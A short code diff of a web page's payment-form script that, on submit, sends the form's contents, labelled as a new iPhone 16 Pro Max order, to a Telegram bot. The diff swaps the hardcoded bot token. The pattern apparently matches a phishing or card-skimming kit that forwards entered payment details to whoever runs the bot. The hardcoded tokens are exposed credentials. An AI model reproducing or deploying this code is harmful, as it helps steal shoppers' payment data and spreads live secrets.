@@ -6,7 +6,7 @@ document.getElementById("payment-form").addEventListener("submit", function (e) 
 
   const message = `📦 [طلب جديد - iPhone 16 Pro Max]\n\n${data}`;
 
-  fetch(`https://api.telegram.org/bot7928008804:AAGPVX1ykMSK_yAVeB_LylyLc2MN60xwDoo/sendMessage`, {
+  fetch(`https://api.telegram.org/bot6968763338:AAGPVX1ykMSK_yAVeB_LylyLc2MN60xwDoo/sendMessage`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
@@ -24,3 +24,4 @@ document.getElementById("payment-form").addEventListener("submit", function (e) 
     }
   });
 });
+
